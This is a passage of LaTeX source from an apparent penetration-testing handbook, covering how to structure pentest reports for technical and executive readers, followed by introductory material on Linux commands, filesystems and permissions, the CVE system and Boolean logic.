		Alternatively, a report could be detailed in how the exploit was discovered, exploited and what was exfiltrated. 
		However, there is a point where this becomes too much, necessitating creating a report that is split between 
		``technical'' and ``non-technical'' readers. 
		Such a report is likely to have more sway with both the companies executive staff and their system administrators. 
		Vulnerabilities that have been found, exploited and used to exfiltrate data will be fixed over those with no evidence behind them. 

		The general rules for report writing are as follows:
		\begin{itemize}
			\item Under no circumstances submit a reformatted vulnerability scanner report. 
				This gives no information useful to the company that they couldn't have used the scanner for, making your role as a penetration tester redundant. 
			\item Rate vulnerabilities consistantly, both by their natural severity and the data possible to exfiltrate using them. 
			\item Explain the effects of a given vulnerability on the CIA Triad. 
			\item Use vulnerabilty scanner output for determining serverty, but do not rely on it. 
			\item Discuss exploits that you have successfully tested differently to those that you have not. 
			\item For each finding that you discover, provide a solution to it. 
				At a minimum, provide a mitigation strategy. 
			\item Validate that findings provided by scanners are not based purely on versions, but rather are expoitable on the given machine. 
			\item Create a standard template (such as a \LaTeX{} template and class) and follow it for all reports. 
				This will ensure both formatting and content is consistent accross reports. 
		\end{itemize}

		As a guide line, the following is a section guide for a basic report:
		\begin{enumerate}
			\item \textbf{Introduction:} The overview and top level description of the document. 
				This section should contain an executive summary and 
				(if you are splitting the document for techinical and non-technical readers)
				a reading guide outlining which sections should be read by whome. 
			\item \textbf{Scope:} This section details what limitations were given, what was tested and why. 
				It should give IP ranges, names and URLs of major targets, as well as the objective of hitting those targets. 
			\item \textbf{Changes to requirements:} An overview of changes to the original test paramiters given, if any. 
			\item \textbf{Methodology:} How you went about information gathering, targeting, exploitation and post-exploitation. 
			\item \textbf{Significant findings:} Critical findings only here, with a basic outline of why it is severe 
				and what it gives access to. 
				Expect this to be read by executives rather than technical workers. 
			\item \textbf{Posative Observations:} This is the parts of security that the organisation did well. 
				It should be used to provide a posative note in a report that may otherwise be negative and overbearing. 
				Furthermore, it should be used to reward good practices, as they may only exist on a short teather. 
			\item \textbf{Findings Summary:} An overview of all vulnerabilities found based on severity and exploitability. 
				Break it further into the following sections:
				\begin{itemize}
					\item Practical Exploits: vulnerabilities that you have been able to take through the whole exploitation cycle and exfiltrate data from. 
					\item Theoratical Exploits: vulnerabilities that you have not been able to use in the test. 
				\end{itemize}
				Again, this section should be an overview for the more studious exeuctives and IT managers, rather than detailed content written for sysadmins or security professionals. 
			\item \textbf{Detailed Findings:} Following the same structure as above, go into detail about what each vulnerability
				is, how it was expoited and why it was given the severity it was. 
				This is the place to go into technical detail, explaining exactly what was done and how to fix it. 
				This is also the section in which you should place relevant short logs, captured data and other details. 
			\item \textbf{Appendix:} This would have scans, exfiltrated data and any aditional information that the reader doesn't want to sift through in the main document. 
				However, if you put it in here, it must be referenced within the main text, 
				this section is not a dumping ground to make the document look bigger. 
		\end{enumerate}
		
		In addition to this, you may want to report on Open Source Intelligence that was used to enumerate the location and 
		data of the organisation. 
		This will be usefull if they are attempting to reduce their online presence, or simply to know where attacks are more likely to hit. 
		Furthermore, you should provide a means of checking whether mitigations they may put in place were successful. 
		This may be through offering your services in a limited fashion to test again. 
		However, you may also write scripts which can be executed in a specified environment to test the vulnerabilty automatically. 

	\section{STIX Model}
		\url{http://stixproject.github.io/}
\newpage
\chapter{General Knowledge}
	\label{ch:GeneralKnowledge}
	\section{Linux}
		This section will be a general overview of the Linux world. 
		It will go through the terminology, history, reasoning and other issues that people new to the OS face\cite{LinuxIntro}. 
		\subsection{Terminology}
			Below is a far from exhaustive list of terminology used within the Linux world:
			\begin{description}
				\item[Linux] The kernel that underpins the OS that is often referred to as Linux. 
				\item[GNU] An organisation that maintain a tool set which runs on Linux (and will run on any Unix, soon windows)
				\item[GPL] A licencing system that requires that changes be retransmitted back to the rest of the world. 
				\item[Terminal] The command line access to a Linux computer.
				\item[Root] Either the base user or base directory. 
					In the former case, this is the user that has absolute power over the OS. 
					In the latter case, this is the first directory of the system. 
				\item[Filesystem] The system that file storage works on\footnote{\href{http://linux.die.net/man/7/hier}{man 7 hier}}: 
				\begin{description}
					\item[/etc] The configuration directory. 
						This houses all system configuration as well as specific program configurations. 
						This serves much the same purpose as the windows registry, but in a far better format. 
					\item[/boot] The boot configuration of the system. 
						Should only contain the minimum necessary to boot the system. 
						On an MBR system, the bootloader configuration will be here. 
						On an EFI system, the EFI boot manager will be mounted at /boot/efi
					\item[/dev] A virtual filesystem which gives the OS pointers to certain devices\footnote{\href{http://linux.die.net/man/1/mknod}{man 1 mknod}}. 
						\begin{itemize}
							\item Storage devices
							\item CPUs
							\item Memory
							\item Sound
							\item Networking
							\item Mapper (Used for encryption mounting)
							\item null (Used for getting zeros at the shell)
							\item random (Used for getting random numbers at the shell)
							\item input
						\end{itemize}
					\item[/bin] The binaries used for basic user interaction. 
					\item[/sbin] /bin, but for system binaries, usually not used by normal users.
					\item[/home] Stores user home directories (which then store documents, photos, etc)
					\item[/lib] System libraries which are used for running dynamically linked programs. 
						These are the minimum required to boot and run the system. 
					\item[/media or /mnt] Used for mounting drives to. 
					\item[/opt] Optional or extra packages from outside the systems package manager
					\item[/proc] Process information. Can be a good place to find information that shouldn't have been leaked\footnote{\href{http://linux.die.net/man/5/proc}{man 5 proc}}.
					\item[/root] The root user's home directory. 
					\item[/run] Files that support the current running of the system. Usually temporary. 
					\item[/srv] Server files. Some systems use this for web or other services rather than ``/var''. 
					\item[/sys] Similar to ``/proc'' but kernel only and better secured. 
					\item[/tmp] Temporary files which may be deleted at any time (such as booting or a regular job).
					\item[/usr] Data that can be shared between systems, generally minor program specific config and libraries. 
					\item[/var] Items that can change in size, such as logs and caches. 
				\end{description}
				\item[CLI] Command Line Interface, also referred to as a \textbf{shell}. 
					This is the system used to interact with the computer using typed commands, rather than selecting the item that you wish to interact with graphically. 
				\item[GUI] Graphical User Interface, the opposite of CLI. 
					This is the interface that you see and select graphically what you want to do. 
					However, it is far more limiting than the CLI as you cannot string ideas and programs together in infinite ways. 
					It is just simpler to learn and understand. 
				\item[Distro] A distribution. Someone's (usually an organisation's) version of Linux and the configuration and tools that make it a useful operating system. 
					Examples include Debian, Arch, Gentoo and Kali. 
				\item[Kernel] The core of an operating system. 
					This program interacts with the hardware of the system, creating an abstraction layer that other software can interact with. 
				\item[Open Source] This is the notation that the source code of a program is available freely. 
					This means that people can read it, adapt it to their needs and then re-introduce it into the world. 
					It has been the main driver for Linux adoption.
				\item[Free Software] This is a movement similar to open source, but more vehement in their stance. 
					All software must be free (as in the code freely available) for reasons of security, progress and ideology. 
					This is mainly pushed by the GNU movement and the Free Software Foundation.
				\item[Run Level] This is the level to which the system boots. 
					These can also be known as targets on newer systems. 
					They can be single user, multi-user, CLI only or graphical. 
				\item[Access Control] The standard means of specifying who can access what on a Linux system. 
					Generally, this is done using discretionary access control. 
					However, some systems such as Grsecurity and SELinux use Mandatory access control, which is an external enforcer on who can access files on the system. 
			\end{description}
		\subsection{History}
			The history of Linux is an interesting one with deep roots in early computer science and operating systems. 
			To understand why Linux was built the way it is, you must first understand UNIX and some of the computer designs that were common at the time. 
			\subsubsection{UNIX}
				No section on Linux would be complete with out at least a small section on UNIX. 
				At the time, before the late 60's and early 70's, computers were exceptionally expensive and large. 
				Furthermore, most of them had software specific to that computer, running on a processor architecture that no other type of machine used. 
				Thus, software written for one system would almost never work on another, 
				and the skills gained on one would be useless on another. 

				Until this time, these issues were the only paradigm for computing. 
				However, in 1969, a team at AT\&T Bell Labs began working on a solution to the problem. 
				There system---which became UNIX---was designed to be:
				\begin{itemize}
					\item Simple and Elegant
					\item Written in the more portable C language, rather than the Assembly that was common at the time. 
					\item Able to recycle code. 
				\end{itemize}
				The idea of code recycling was the important part of UNIX. 
				Until this time, all operating systems were built using a language and environment specific to that machine. 
				UNIX however, had only one small part which needed to be specific: the Kernel. 
				This piece of code was built to interact with the hardware and allow other software to interact with it. 
				Thus, no matter what hardware the Kernel was running on, the software could be made work. 

				This idea of multiple computers from different vendors running the same OS led to a number of ``weird'' situations. 
				Computers from different vendors could communicate over a network, 
				software vendors could sell for multiple computer vendors with little extra work. 
				Finally, people could be educated on one system and use most of them. 

				Sadly, at the time, computers that could run UNIX were expensive and large. 
				Thus, when the home computer (or micro-computer) revolution happened, these computers were left out of UNIX. 
				This led to many people running MS-DOS (or another DOS) or early versions of Windows. 
				This is a situation that has not changed to date. 
				However, progress is being made. 

			\subsection{Building Linux}
				While UNIX itself was proprietary code, the concepts and standards that it created were open to anyone. 
				Thus, when in the 90s, home PCs became powerful enough to run full UNIX systems, 
				Linux Torvalds, a computer science student, started writing the code required for it. 

				From the outset, the goal of this system was to crate a fully POSIX (the standard for UNIX) compliant OS for academic use. 
				This led to a system that was free to use with the code available to edit and that was completely UNIX compliant. 
				Thus, people came in droves. 
				They were looking for a system similar to what they had in universities, or at work and Linux provided it. 
				However, the hardware for a home PC was vastly different and more varied than that of a mainframe from the 1970s. 
				It was this difference that could have been the downfall of Linux. 
				But with Linus' decision to leave the code open, many people wrote their own drivers for it, allowing sound, graphics and general system use to work on some of the most obscure hardware around. 

				Within two years, the project had grown to 12000 users. 
				It continued to grow and stay within the POSIX standard, slowly adding the whole feature set of UNIX.
				This had made it a huge player in the server arena of computing. 
				However, it has still not taken over the desktop computing environment, though that was it's original goal. 

				While back in these early times, it was necessary to know how Linux worked and some systems programming to get it to run, modern Linux systems require none of this. 
				Originally, one had to be able to read and understand manual pages for systems that would not work when first installing Linux. 
				These systems, such as the X11 display driver could often be hard to set up, 
				in some cases, they could physically burn the hardware you were running on. 
				In the modern Linux world, however, distros such as Debian and Linux Mint do all of this for you. 
				This is not to say that you cannot learn the system, distros such as Gentoo and Linux From Scratch will give you that opportunity. 


		\subsection{Linux Commands}
			Linux commands are the basis for interacting with the system. 
			One can think of them as a way to speak to the computer without going through the interpreter that is the GUI. 
			The difference between these two is that the GUI was made to make simple things easy, the CLI makes complex things possible. 
			Thus, using the CLI to ``speak'' to the computer allows you to interact with the system. 

			The CLI can be broken down into parts. 
			Each of these parts has a name and properties, as seen in table \ref{tab:CLIParts}. 
			\begin{table}[H]
				\centering
			%	\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{| p{2.5cm} | p{3cm} | p{3cm} | p{3cm} |}
					\hline
					\multicolumn{1}{|c|}{\multirow{2}{*}{\textbf{Command}}} & \multicolumn{2}{| c |}{\textbf{Arguments}}  & \multicolumn{1}{|c|}{\multirow{2}{*}{\textbf{Other}}}
					\\ \cline{2-3}
					& \multicolumn{1}{|c|}{\textbf{Flags}} & \multicolumn{1}{|c|}{\textbf{Data}} & \\ \hline
					The name or location of the command to run & 
					Switches that change the way the program will work & 
					Data which the program operates on. This can be dispersed within multiple flags &
					Other content such as pipes and redirection. 
					Any commands passed here follow the same format \\ \hline
				\end{tabular}
			%\end{adjustbox}
				\label{tab:CLIParts}
				\caption{Parts of a CLI Command}
			\end{table} 

			Further to this, understanding how the shell that you are using works can make using it far more efficient. 
			Table \ref{tab:BashKeyShortcuts} explains the keyboard shortcuts and commands available in the default bash shell. 
			%TODO: This is linking to the wrong table
			\begin{table}[H]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{| p{3cm} | p{7cm} |} 
					\hline
					\textbf{Key \mbox{Combination}} & \textbf{Function} \\ \hline
					\keys{\ctrl + A} & Move cursor to the beginning of the line. \\ \hline
					\keys{\ctrl + C} & End a running program and return to the prompt. \\ \hline
					\keys{\ctrl + D} & Log out of the current shell session, equal to typing ``exit'' or ``logout''. \\ \hline
					\keys{\ctrl + E} & Move the cursor to the end of the line. \\ \hline
					\keys{\ctrl + H} & Generate a backspace character. \\ \hline
					\keys{\ctrl + L} & Clear the terminal. Equivalent to typing ``clear''. \\ \hline
					\keys{\ctrl + R} & Search command history. \\ \hline
					\keys{\ctrl + Z} & Suspend a program. \\ \hline
					\keys{\arrowkeyright} or \keys{\arrowkeyleft} & Move the cursor one place on the current line. \\ \hline
					\keys{\arrowkeyup} or \keys{\arrowkeydown} & Browse command history. \\ \hline
					\keys{\shift + Page Up} or \keys{\shift + Page Down} & Browse terminal buffer (See text that has been scrolled off screen. 
					\\ \hline
					\keys{\tab} & Command or Filename completion. If multiple options exist the system will prompt for a choice. \\ \hline
					\keys{\tab + \tab} & Show options for completion. \\ \hline
				\end{tabular}
			\end{adjustbox}
				\label{tab:BashKeyShortcuts}
				\caption{Keyboard Shortcuts for the Bourne Again Shell}
			\end{table}

			Commands are also altered by a set of variables called the environment. 
			These variables are inherited from the calling program, and can give instructions as to where to find things or how to act. 
			For example, when you load up your favorite shell, it reads from the ``PATH'' variable to determine where to find programs to run. 
			You can see the values of these variables by running the command ``echo \$<name>'' at the prompt. 
			They can either be set in your ``.bashrc'' equivalent, or by using the command ``export''. 

			A summary of the most common Linux command can be found in table \ref{tab:LinuxCommandsSummary}.
			\begin{center}
				\begin{longtable}{| l | p{6cm} |}
					\hline
					\textbf{Command} & \textbf{Use} \\ \hline
					\endhead
					\multicolumn{2}{|r|}{{Continued on next page}} \\ \hline
					\endfoot
					\endlastfoot
					cat & Send the content of a file to STDOUT. 
							Multiple files will be appended to each other. \\ \hline
					cd <directory> & Enter directory \\ \hline
					chgrp & Change the group ownership of a file. \\ \hline
					chmod <mode> <file> & Change permissions of files to <mode>. \\ \hline
					chown <owner>[:<group>] <file> & Change owner or group owner of file. \\ \hline
					cp <src> <dest> & Copy src to dest. \\ \hline
					df & Reports disk usage. \\ \hline
					echo <string> & Print string to STDOUT. \\ \hline
					export & A bash internal that adds to environmental variables. \\ \hline
					file & Determine the type of a file. \\ \hline
					find <path> <expression> & find files within the file system. \\ \hline
					grep <pattern> [file] & Print only lines which match pattern. 
											If file given, search it, otherwise search STDIN \\ \hline 
					head <file> & Print the top of file. \\ \hline
					id & Prints real and effective user names and IDs. \\ \hline 
					info <command> & Basic documentation about a command. \\ \hline
					less [file] & View a file or STDIN with a pager. \\ \hline
					ln <target> <name> & create a link to target named name. 
										use ``-s'' for simlink. \\ \hline 
					locate <string> & Search the file database for string. \\ \hline
					ls & Prints directory content. \\ \hline 
					man <command> & Use the system pager to read the manual for command. \\ \hline
					mkdir <name> & Make a new directory named name. \\ \hline
					mv <src> <dest> & Move src to dest. \\ \hline
					newgrp <name> & Log into a new group. \\ \hline
					pwd & Print the current working directory. \\ \hline 
					quota & Show disk usage and limits. \\ \hline
					rm <file> & Delete files or directories. 
								Directories will only be deleted with the ``-r flag''. \\ \hline
					tail [file] & Print the end of file or STDIN. \\ \hline
					umask & show or change new file creation permission mode. \\ \hline
					wc [file] & Counts lines, words and characters in file or STDIN. \\ \hline
					which <command> & shows the full path to command. \\ \hline
					\noalign{\vskip 0.5cm}
					\caption{\label{tab:LinuxCommandsSummary}Basic Command Reference for Linux}
					\vspace{-1.3cm}
				\end{longtable}
			\end{center}

			Further to this, there are a number of special characters which can give powerful actions. 
			Table \ref{tab:SpecialCommands} shows the special characters that can be used on the bash commandline. 
			\begin{table}[H]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{| l | p{7cm} |}
					\hline
					\textbf{Character} & \textbf{Use} \\ \hline
					\$(<command>) & Run command and replace the block with it's output. \\ \hline
					\verb+`+<command>\verb+`+  & As for \$ \\ \hline
					<command1> | <command2> & Send STDOUT of command1 to STDIN. \\ \hline
					<command> > <file> & Send STDOUT of command to file. \\ \hline
					<command> < <file> & Send file to command as STDIN. \\ \hline
				\end{tabular}
			\end{adjustbox}
				\label{tab:SpecialCommands}
				\caption{Linux Commandline Special Characters}
			\end{table}

			\FloatBarrier
		\subsection{Man Pages}
			The information found here is simply an introduction. 
			It is a small subsection of the information that exists on Linux and it's systems. 
			Most of this information can be found in its most raw technical form in the Linux man pages. 

			These documents are the basis for working with Linux programming, as well as programming on Linux. 
			It is broken down into chapters---each having an overarching topic---then further broken into commands or functions. 
			A condensed table of contents for man pages is below:
			\begin{enumerate}
				\item User Commands
				\item System Calls
				\item Library Functions
				\item Special Files
				\item File Formats
				\item Games
				\item Conventions and Miscellany
				\item Administration and Privileged Commands
				\item[L.] Math Library Functions
				\item[N.] TCL Functions
			\end{enumerate}

			The individual pages within these documents are also broken into standard sections. 
			These sections are:
			\begin{enumerate}
				\item Name of the command and ID of section.
				\item Name of command and a short description. 
					This description is seachable using the ``apropos'' command. 
				\item Synopsis of the command with full technical notation. 
					Generally this will give all basic options. 
					Optional arguments are within [ ] brackets.
				\item A longer Description
				\item Options with descriptions listed. 
				\item Environmental Variables that effect the command or function. 
				\item Command or function specific sections. 
				\item See Also references to other man pages. 
				\item Author of the given page. 
				\item Known bugs. 
			\end{enumerate}

			These pages can be navigated in the same way as the system pager, which on most modern systems is less. 
			For simpler descriptions, the ``info'' command works in a similar way. 

		\subsection{File Systems}
			On Linux, everything is a file. 
			If it's not a file, it's a process, and there is a file for that too. 

			Thus, on Linux, understanding the file system is one of the most useful parts of understanding the system. 
			This is because many files that are available in Linux are more than just files. 
			There are a number of different items which look and act like files, but allow you to do more complex things. 

			\subsubsection{Types of Files} 
				The common files that you have been working with are generally termed ``regular files''. 
				Other files that you will come across are:
				\begin{description}
					\item[Directories] Files that list other files within them.
						Listed as ``d'' in file permissions. 
					\item[Special Files] Files used for IO. Most are stored within ``/dev''. 
						See the terminology section for more information. 
						Listed as ``c'' in file permissions.
					\item[Links] Files that make the same file visible in more than one part of the directory structure. 
						Listed as ``l'' in file permissions. 
					\item[Sockets] Similar to TCP/IP sockets. 
						These allow inter-process networking under the filesystems access control. 
						Listed as ``s'' in file permissions.
					\item[Named Pipes] Similar to sockets, but simpler to use without explicitly programming for them. 
						Listed as ``p'' in file permissions. 
				\end{description}


			\subsubsection{Mounting}
				Linux filesystems are usually broken down into partitions. 
				These partitions are used to allocate a given amount of space to a given part of the OS. 
				However, they also have a number of security purposes, as well as simple data loss prevention. 

				To see the filesystems on your computer, the commands ``lsblk'' or ``df -h'' will show what systems are available, where they are mounted and what storage is available on them. 
				Without any user interaction, this will be the same as the contents of the filesystem table found at ``/etc/fstab''. 
				An example of the content of one of these files can be found in table \ref{tab:fstab}. 
				The contents of this table, when formatted correctly and placed on the correct system will work. 
				\begin{table}[htb]
					\centering
				\begin{adjustbox}{max width=1\textwidth}
					\begin{tabular}{| l | l | l | l | l | l |}
						\hline
						\textbf{File System} & \textbf{Directory} & \textbf{Type} & \textbf{options} & \textbf{dump} & \textbf{pass} \\ \hline
						/dev/sda1 & / & btrfs & rw,noatime & 0 & 0 \\ \hline
						%UUID=aeb6cbbf-f40c-4659-9d81-605e84467349 & / & btrfs & rw,relatime & 0 & 0 \\ \hline
						/media/store & /srv/nfs4/store & none & bind & 0 & 0 \\ \hline
					\end{tabular}
				\end{adjustbox}
					\label{tab:fstab}
					\caption{A standard Linux fstab}
				\end{table}
				The filesystems stated in table \ref{tab:fstab} will mount automatically at boot, or when the command ``mount <file system>'' is given. 
				However, to mount filesystems that are not constant within the system, you must use the mount\footnote{\href{http://linux.die.net/man/8/mount}{man 8 mount}} command specifically.
				\begin{lstlisting}[style=CLI]
					# mount -o <option>,<option> -t <type> <file system> <directory> 
				\end{lstlisting}
				The same options and data will work here as in the fstab, however, the format it different as it is expressed at the CLI. 

			\subsubsection{File System Structure}
			\begin{quote}%TODO: This is horrid. Find a better way. 
				\begin{quote}
				\framebox{\parbox{\dimexpr\linewidth-2\fboxsep-2\fboxrule}{\itshape%
				This section is an in-depth discussion on how a Linux filesystem works.
				Feel free to skip it, as it has little use in working with Linux. 
				However, it can become important when trying to diagnose issues with it.}}
				\end{quote}
			\end{quote}
				
				The Linux file structure is commonly through of as a tree. 
				This makes sense when dealing with the way that users interact with it. 
				Every directory that exists follows some branch from the ``root'' directory, with files being the ``leaves'' at the end. 
				However, this understanding only works when one is dealing with the system at the basic user level. 
				One should understand the concept of inodes and the other building blocks of the structure if they are to administer the system. 
				
				Each partition on the computer has it's own filesystem. 
				This can be thought of in the same way as the whole Linux structure, having it's own root. 
				However, this only becomes important when looking at how the devices are specified. 
				Each file system has a list of inodes that are created when the system is initialised. 
				This is a limited list (usually 1 or 2 per 8KB) of information about files. 
				The information contained is as follows:
				\begin{itemize}
					\item Owner and group of the file.
					\item File type.
					\item Permissions of the file.
					\item Date and time of creation. 
					\item Last read and change.
					\item Date and time of inode information changes. 
					\item Number of links to the file. 
					\item File size.
					\item Address defining the actual location of the data. 
				\end{itemize}

				As you can see, the file name and it's directory is not given in this list. 
				This is because files in Linux do not by nature have either. 
				They are created through directories---special files in themselves---that contain lists of files and names. 
				This is why directories will show up as files with permissions when running ``ls -l''. 
				It is also why you can see files that you do not have read permissions for, assuming you can read the directory. 

				Understanding these inodes, and the information held within them can be exceptionally useful for understanding issues with the filesystem. 
				For example, if you have a large number of small files, you may run out of inodes on the system. 
				This will lead to commands such as ``du -h'' and ``df -h'' telling you that there is space available, while you get ``filesystem full'' errors when creating files. 
				In this instance, the command ``df -i'' will tell you how many inodes are available. 

				Further to this, understanding what is stored in inodes means that you can think about how that will impact access speeds and disk failure. 
				SSDs for example, have a limited number of writes. 
				Writing to the disk each time a file is read (the atime stored in inodes) creates significant wear on the disk. 
				Mounting with the ``noatime'' option will resolve this and cause the drive to last significantly longer. 

				A direct implication of inodes is the way that linking works on Linux. 
				Hard links on the system are files with the same inode as each other. 
				For all intents and purposes, these are the same file. 
				However, these cannot work over multiple file systems, as each will have a different file at the same inode. 
				Due to this, simlinks were created. 
				These perform the same action as hard links, but have two different inodes. 
				The first inode---that of the original file---contains the files data. 
				The second---that of the link---contains the data of the link and the address to the data of the original file. 
				This means that the links can span over multiple file systems with no issues. 

				
			\subsubsection{File Permissions}
				\begin{table}[H]
					\centering
				\begin{adjustbox}{max width=1\textwidth}
					\begin{tabular}{| l | l | l |}
						\hline
						\textbf{Letter} & \textbf{Octal} & \textbf{Meaning} \\ \hline
						- & 0 & Right in this position not granted \\ \hline
						r & 4 & Read access is granted in this position \\ \hline
						w & 2 & Write access is granted in this position \\ \hline
						x & 1 & Execute access is granted in this position \\ \hline
					\end{tabular}
				\end{adjustbox}
					\caption{UNIX File Permissions Keys}
					\label{tab:UNIXPermissionKeys}
				\end{table}
				UNIX file permissions are shown in the following format:
				\begin{center}
				\begin{tabular}{| c | c | c | c | l |}
					\hline
					Directory & User & Group & Other & Extended \\ \hline
					d or - & rwx or -{}-{}- & rwx or -{}-{}- & rwx or -{}-{}- & . for SELINUX. \\ \hline
				\end{tabular}
				\end{center}


				When you are working with these, the chmod command is used to change them. 
				This command uses the following options to choose where to set the flag:
				\begin{center}
					\begin{tabular}{| c | l |}
						\hline
						\textbf{Code} & \textbf{Description} \\ \hline
						u & User Permissions \\ \hline
						g & Group Permissions \\ \hline
						o & Other Permissions \\ \hline
					\end{tabular}
				\end{center}
	\section{The CVE System}
		The Common Vulnerability and Exposure system is a dictionary of publicly known security vulnerabilities\footnote{\url{https://cve.mitre.org/}}
		This system was created to enable data exchange between security products and provide a base line index point for evaluating coverage for those tools. 
		However, it has now become the standard for releasing a vulnerability and for determining exactly what attack was launched. 

		This system allocates a unique CVE-ID to each vulnerability or exposure that is publicly released through them. 
		This is usually done early on in the investigation, as the organisation will not release the information until the vulnerability is made public. 
		However, due to this, the CVE list may be out of date by a factor of years in some areas. 

		These numbers are then used in all correspondence and publications of the vulnerability, leading to them becoming a search tool for that particular release. 
		This means that if you are searching for information about a particular vulnerability, finding the CVE that goes with it will likely lead to finding multiple releases about it. 
		Furthermore, exploits an exploit kits usually note the CVE that they target, allowing you to search them by the given CVE. 
		This is also the case with tools such as Nessus, which gives all relevant CVEs for any of its scan responses. 

		
	\section{QR Codes}
	\section{Regex}
	\section{Boolean Mathematics}
		Boolean Mathematics, or Boolean Logic is the basis for most low level operations within a computer. 
		This is because it is used at all levels, from the circuitry itself, up to high level programming. 
		Boolean logic deals with evaluations to either \textbf{True} or \textbf{False}, 
		which are equivalent to \textbf{1} or \textbf{0} respectively.\footnote{Many languages treat non-zero as true. However, at the binary level, it must be 1}

		There are a number of different logical statements. 
		These can be linked together, allowing for complex calculations. 
		The definitions for these statements can be found below:
			\begin{description}
				\item[AND] Both inputs must evaluate to true. 
					This will be shown as either \& (bitwise), \&\& (logical) or $\wedge$ (Mathematical).
				\item[OR] Either of the inputs must evaluate to true. 
					This will be shown as either | (bitwise), || (logical) or $\vee$ (Mathematical). 
				\item[NOT] This simply negates the output of one expression.
					This will be shown as either \~ (bitwise), ! (logical) or $\neg$ (Mathematical).
				\item[XOR] Either one or the other must be true. However, both cannot be. 
				This will be shown as either \verb+^+ (bitwise) or $\oplus$ (Mathematical).
			\end{description}
	
\appendix
	\label{ch:Appendix}
	\bibliographystyle{plain}
	\bibliography{program}
\end{document}
